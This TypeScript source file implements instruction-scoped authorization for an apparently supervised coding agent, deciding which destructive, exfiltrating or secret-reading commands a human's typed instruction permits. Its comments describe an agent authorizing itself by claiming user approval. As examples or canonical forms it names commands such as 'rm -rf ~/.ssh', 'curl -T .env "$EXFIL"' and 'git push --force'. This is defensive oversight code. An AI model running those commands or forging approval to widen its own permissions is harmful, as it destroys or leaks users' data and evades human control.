// bridge/src/handler/authorization.ts

// Instruction-scoped authorization (§5.4). A lift is derived ONLY from the text a
// human typed into `handler:instruct` — the PA bar and the preset chips both funnel
// through `HandlerEngine.instruct`, and that method is the single feed point. Never
// the transcript, never judge/Assistant output: those are attacker-influenced, and an
// agent that could authorize itself by writing "the user approved this" into its own
// output would turn the advisory floor (§5.1) into decoration.
//
// Two grades, because "the user named this operation" and "the user named this
// target" are different claims:
//   pattern lift — DESTRUCTIVE/EGRESS/SECRETS shapes, keyed by `FloorWarning.pattern`.
//   literal lift — ABS_PATH and egress hosts, keyed by the exact string. Naming one
//                  path outside the project must not open the filesystem; naming one
//                  host must not open the network.
// HARD (§5.3) is liftable by nothing at all.

import { classifyDestructive, isInsideProject, type FloorWarning } from "./destructive-floor";

export interface InstructionAuthorization {
  /** Floor pattern sources whose OPERATION a user named. */
  readonly patterns: Set<string>;
  /** Outside-project paths named verbatim. Exact strings, never prefixes. */
  readonly paths: Set<string>;
  /** Hosts named verbatim, normalized by `normalizeHost`. */
  readonly hosts: Set<string>;
}

/**
 * The floor tiers a PATTERN lift can silence. ABS_PATH takes a literal lift
 * instead (`paths`), and §5.3 HARD takes none at all.
 */
export type LiftedTier = "DESTRUCTIVE" | "EGRESS" | "SECRETS";

export interface LiftedOperation {
  /**
   * Which advisory this lift silences. Carried rather than dropped because the
   * three tiers are three unlike permissions — a command that destroys, one that
   * sends data out, one that reads a secret — and a summary that calls them all
   * "commands" tells the user the wrong one was granted.
   */
  readonly tier: LiftedTier;
  /** The operation spelled the way it was named. */
  readonly matched: string;
}

export interface GrantSummary {
  patterns: string[];
  /**
   * The same operations `patterns` stand for, spelled the way they were named.
   * A pattern is a regex source: it is the only stable key a lift can hang on,
   * and it is also the one thing that can never be put in front of a user — so
   * the readable half is carried out beside it rather than reconstructed by a
   * caller that would have to re-derive it from the floor.
   *
   * Deduped, so an alias whose command trips two floor patterns reads as the one
   * operation the user named.
   */
  operations: LiftedOperation[];
  paths: string[];
  hosts: string[];
  /**
   * The subset of `hosts` a summary may repeat back. `hosts` is a deliberate
   * superset (see BARE_HOST) that only ever has to agree with itself across
   * granting and checking; this half is what a user is shown, so it holds only
   * the tokens that can be nothing but a destination.
   */
  destinations: string[];
}

// An instruction is free text of unbounded length, and these sets live for the whole
// session. A pasted wall of prose must not turn into a permanent lookup table.
const MAX_LITERALS = 64;

interface Alias {
  /** Natural-language spellings of one operation. */
  phrases: RegExp[];
  /** The command those spellings stand for; the floor decides what it trips. */
  command: string;
}

// The floor's patterns are COMMAND-shaped and an instruction is natural language, so
// scanning "force push branch" with the floor regexes matches nothing — a lift derived
// from that scan alone would be dead code that still passes its own tests. This table
// closes the gap for the four operations §5.2 can actually prepare a snapshot for,
// which are also the ones a user routinely names in prose.
//
// It stays narrow and demands specific phrasing, because the two failure directions are
// not symmetric: a MISSING lift costs one advisory row in the activity feed, while a
// SPURIOUS lift costs the warning that would have told the user what happened. When a
// phrasing is arguable ("clean up the build files"), leave it out.
//
// Entries name a canonical COMMAND rather than a pattern source, so the floor stays the
// single definition of what that command trips and no key here can go stale — or, worse,
// silently grant a pattern the floor no longer emits — after a floor edit.
//
// Every alias needs an ANCHOR, because the bare operation nouns are ordinary
// product-development vocabulary: "add a hard reset button to the settings screen",
// "add a force delete confirmation dialog", "recursively delete stale LRU entries".
// None of those asks for anything to happen to the repo or the disk, and a lift
// granted from one silently suppresses every §5.1 advisory row for the rest of the
// session — the failure this table is least able to afford.
const REPO_ANCHOR = String.raw`\b(?:git|repo|repository|branch|commit|HEAD|origin|upstream|working\s+tree)\b`;
// No "cache" — "force remove the row from the cache" is in-memory prose, and the
// filesystem sense always spells itself "cache dir"/"cache directory" anyway.
const FS_ANCHOR = String.raw`\b(?:dirs?|directory|directories|folders?|files?|node_modules|build|dist|out|target|coverage|vendor|artifacts?)\b`;

/** An anchored phrase, in either order — prose puts the anchor on either side. */
function anchored(phrase: string, anchor: string, gap = 40): RegExp[] {
  return [
    new RegExp(`${phrase}[^\\n]{0,${gap}}${anchor}`, "i"),
    new RegExp(`${anchor}[^\\n]{0,${gap}}${phrase}`, "i"),
  ];
}

const RM_PHRASES = [
  String.raw`\brecursive(?:ly)?\s+(?:delete|remove|rm)\b`,
  String.raw`\b(?:delete|remove)\b[^\n]{0,24}\brecursively\b`,
  String.raw`\bforce[\s-](?:delete|remove)\b`,
];

const ALIASES: Alias[] = [
  {
    phrases: [
      ...anchored(String.raw`\bhard[\s-]?reset\b`, REPO_ANCHOR),
      /\bgit\s+reset\b[^\n]{0,32}\bhard\b/i,
    ],
    command: "git reset --hard HEAD",
  },
  {
    // "force push" is unambiguous on its own: it names no operation outside git.
    phrases: [
      /\bforce[\s-]?push(?:ing|ed|es)?\b/i,
      /\bpush(?:ing|ed|es)?\b[^\n]{0,24}(?:--force\b|-f\b)/i,
    ],
    command: "git push --force origin main",
  },
  {
    phrases: RM_PHRASES.flatMap((p) => anchored(p, FS_ANCHOR)),
    command: "rm -rf build",
  },
  {
    // "untracked" is a git term with no other meaning; "ignored files" is not, and
    // "clean up the ignored files section of the docs" is the case that proves it.
    phrases: [
      /\bgit\s+clean\b/i,
      /\bclean\b[^\n]{0,24}\buntracked\s+files?\b/i,
    ],
    command: "git clean -fd",
  },
];

// ABS_PATH is excluded rather than incidentally absent: an alias grants an operation,
// and a canonical command that ever grew a path must not hand out a literal lift.
export const ALIAS_LIFTS: {
  phrases: RegExp[];
  lifts: { pattern: string; tier: LiftedTier }[];
  command: string;
}[] = ALIASES.map((a) => ({
  phrases: a.phrases,
  // Carried through for the grant summary: an alias fires on prose, and the
  // canonical command is the only readable spelling of what it granted.
  command: a.command,
  lifts: classifyDestructive(a.command, "").warnings.flatMap((w) =>
    w.tier === "ABS_PATH" || w.tier === "HARD" ? [] : [{ pattern: w.pattern, tier: w.tier }]),
}));

const URL_AUTHORITY = /\b[a-z][a-z0-9+.-]*:\/\/([^\s/?#'"<>]+)/gi;
// Dotted names with an alphabetic final label. A filename like `dump.json` reads as a
// host here; that is symmetric across granting and checking, so it costs nothing beyond
// the odd unlifted warning. IPv6 literals are not recognized at all — same cost.
// Nothing built from this set may be REPORTED — naming a source file is the commonest
// thing a user types, and a summary reading it back as a network permission would be
// false on most instructions. `GrantSummary.destinations` is the half that is shown.
const BARE_HOST = /\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,63})\b/gi;
const IPV4 = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;

function normalizeHost(h: string): string {
  return h.split("@").pop()!.replace(/:\d+$/, "").replace(/\.$/, "").toLowerCase();
}

function hostsIn(text: string): Set<string> {
  const out = new Set<string>();
  for (const m of text.matchAll(URL_AUTHORITY)) out.add(normalizeHost(m[1]!));
  for (const m of text.matchAll(BARE_HOST)) out.add(normalizeHost(m[1]!));
  for (const m of text.matchAll(IPV4)) out.add(m[0]!);
  return out;
}

/** The subset of `hostsIn` that can only be a destination — a URL authority or an IP. */
function destinationsIn(text: string): Set<string> {
  const out = new Set<string>();
  for (const m of text.matchAll(URL_AUTHORITY)) out.add(normalizeHost(m[1]!));
  for (const m of text.matchAll(IPV4)) out.add(m[0]!);
  return out;
}

// Windows spellings are folded the way the floor folds them, and sentence punctuation is
// dropped so "check /etc/hosts." authorizes the path the reply names without the period.
function normalizePath(p: string): string {
  return p
    .replace(/\\/g, "/")
    .replace(/^([A-Za-z]):/, (_m, d: string) => `${d.toLowerCase()}:`)
    .replace(/[.,;!?)\]]+$/, "");
}

/** Whether this call is the one that granted `value` — a repeat grants nothing new. */
function grant(into: Set<string>, value: string): boolean {
  if (into.has(value) || into.size >= MAX_LITERALS) return false;
  into.add(value);
  return true;
}

// Both halves of the grant read an instruction as if every clause in it ASKED for
// something, so "never force push" handed out exactly the lift it forbade — and the
// asymmetry above makes that the worst direction available: the sentence most likely
// to be written about a dangerous command is the one telling Handler not to run it.
const PROHIBITION =
  /\b(?:never|not|don't|doesn't|didn't|won't|can't|cannot|shouldn't|mustn't|avoid(?:s|ing)?|refrain|instead\s+of|rather\s+than)\b/i;

// Clause-level, not sentence-level: "delete the build dir, but never touch
// node_modules" has to keep its first half. Rejoined with newlines because every floor
// pattern spans with `[^\n]*`, so a dropped clause cannot be bridged across.
//
// A sentence break needs the whitespace AFTER it. The dots that matter here sit inside
// tokens — `.env`, `log.txt`, `logs.example.com` — and splitting on a bare `.` tore
// apart the very commands and hosts this function exists to read.
function grantableClauses(text: string): string {
  return text
    .split(/(?<=[.!?])\s+|[;\n]+|\s+but\s+/i)
    .filter((clause) => !PROHIBITION.test(clause))
    .join("\n");
}

export function createAuthorization(): InstructionAuthorization {
  return { patterns: new Set(), paths: new Set(), hosts: new Set() };
}

/**
 * Record what one instruction authorizes for the rest of the session. Both halves are
 * needed: the scan catches a user who pasted a literal command, the alias table catches
 * the same user describing it in English.
 *
 * Call this with the RAW payload text, before extraction — extraction output is written
 * by the judge, and deriving a lift from it would let a compromised agent widen its own
 * permissions through the extractor.
 */
export function authorizeInstruction(
  auth: InstructionAuthorization, text: string, projectPath: string,
): GrantSummary {
  const before = { p: auth.patterns.size, f: auth.paths.size, h: auth.hosts.size };
  // Every grant below reads the PERMITTED clauses, never the raw text: a prohibition
  // names the same command a request does, and only the polarity tells them apart.
  const asked = grantableClauses(text);
  // floor.hard is ignored, not consulted: §5.3 has no lift, so naming one of those
  // commands in an instruction must leave no trace here.
  const floor = classifyDestructive(asked, projectPath);
  const operations: LiftedOperation[] = [];
  const seen = new Set<string>();
  const note = (tier: LiftedTier, matched: string) => {
    if (seen.has(`${tier} ${matched}`)) return;
    seen.add(`${tier} ${matched}`);
    operations.push({ tier, matched });
  };
  for (const w of floor.warnings) {
    if (w.tier === "ABS_PATH") grant(auth.paths, normalizePath(w.matched));
    // The matched span, not the whole clause: a pattern lift is a claim about an
    // OPERATION, and the sentence around it named a target the lift did not grant.
    else if (w.tier !== "HARD" && grant(auth.patterns, w.pattern)) note(w.tier, w.matched);
  }
  for (const lift of ALIAS_LIFTS) {
    if (lift.phrases.some((re) => re.test(asked))) {
      // The table's canonical command rather than the prose that fired it: "force
      // push the branch" is what the user wrote, and `git push --force` is what
      // they can now expect to see run.
      for (const l of lift.lifts) if (grant(auth.patterns, l.pattern)) note(l.tier, lift.command);
    }
  }
  // Harvested from the whole instruction rather than only from an egress match: the user
  // names the destination in prose ("post it to logs.example.com"), while the command
  // shape that carries it there shows up later, in the reply.
  for (const h of hostsIn(asked)) grant(auth.hosts, h);

  const added = <T>(set: Set<T>, n: number) => [...set].slice(n);
  const destinations = destinationsIn(asked);
  const hosts = added(auth.hosts, before.h);
  return {
    patterns: added(auth.patterns, before.p),
    operations,
    paths: added(auth.paths, before.f),
    hosts,
    destinations: hosts.filter((h) => destinations.has(h)),
  };
}

// Targets a pattern lift cannot reach on its own: `~`-rooted, parent-escaping, or
// absolute and outside the project. A pattern lift is a claim about an OPERATION, so
// without this "recursively delete the build directory" also authorized `rm -rf ~/.ssh`
// — same pattern, a target the user said nothing about. Naming one of these still
// works; it needs the second grade of lift (the literal one) to do it.
const OUTSIDE_ROOTED = /(?:^|[\s'"=])~[/\\]|(?:^|[\s'"=/\\])\.\.[/\\]/;
// Deliberately WIDER than the floor's own ABS_PATH, which requires an interior separator
// so a slash command is not read as a path: this one answers whether the text names a
// target outside the project, and a bare root is a real answer to that. Narrowing the two
// in lockstep would let "recursively delete the build dirs" authorize `rm -rf /tmp`.
const ABSOLUTE_TARGET = /(?:^|[\s'"=])(\/[^\s'"]+|[A-Za-z]:[\\/][^\s'"]+)/g;

function namesTargetOutsideProject(flaggedText: string, projectPath: string): boolean {
  if (OUTSIDE_ROOTED.test(flaggedText)) return true;
  for (const m of flaggedText.matchAll(ABSOLUTE_TARGET)) {
    if (!isInsideProject(m[1]!, projectPath)) return true;
  }
  return false;
}

/**
 * `flaggedText` is the full text the warning was classified from, not `w.matched`: the
 * floor's egress patterns stop at the upload flag, so the destination lives in the rest
 * of the line.
 *
 * The egress target claim fails CLOSED. An upload whose destination cannot be resolved
 * to a literal — `curl -T .env "$EXFIL"` — has named no host the user could have
 * authorized, so the operation lift does not stand on its own: §5.4 exists precisely so
 * that naming one host does not open the network, and an unparseable destination is the
 * one the user is least likely to have meant.
 */
export function isAuthorized(
  auth: InstructionAuthorization, w: FloorWarning, flaggedText: string, projectPath: string,
): boolean {
  if (w.tier === "HARD") return false;
  // Exact match only. A path lift is a claim about one file, never about its directory.
  if (w.tier === "ABS_PATH") return auth.paths.has(normalizePath(w.matched));
  if (!auth.patterns.has(w.pattern)) return false;
  if (namesTargetOutsideProject(flaggedText, projectPath)) return false;
  if (w.tier !== "EGRESS") return true;
  // Destinations only. A bare dotted token is read as a host so the grant side can
  // harvest one from prose, but the two sides read DIFFERENT texts — the instruction
  // and the reply — so requiring every such token here rejected `curl -T app.log
  // https://logs.example.com` against an authorization naming that exact host. Bare
  // tokens still stand alone when the text carries no URL or IP at all, which is what
  // keeps an unresolvable destination failing closed.
  const explicit = destinationsIn(flaggedText);
  const hosts = explicit.size > 0 ? explicit : hostsIn(flaggedText);
  if (hosts.size === 0) return false;
  for (const h of hosts) {
    if (!auth.hosts.has(h)) return false;
  }
  return true;
}

/**
 * Split rather than filter. An authorized action carries no warning — the user already
 * said to do it — but it is still snapshotted (§5.4), so the authorized list has to
 * survive the call site for the §5.2 snapshot pass to read.
 */
export function partitionWarnings(
  auth: InstructionAuthorization, warnings: FloorWarning[], flaggedText: string,
  projectPath: string,
): { warn: FloorWarning[]; authorized: FloorWarning[] } {
  const warn: FloorWarning[] = [];
  const authorized: FloorWarning[] = [];
  for (const w of warnings) {
    (isAuthorized(auth, w, flaggedText, projectPath) ? authorized : warn).push(w);
  }
  return { warn, authorized };
}
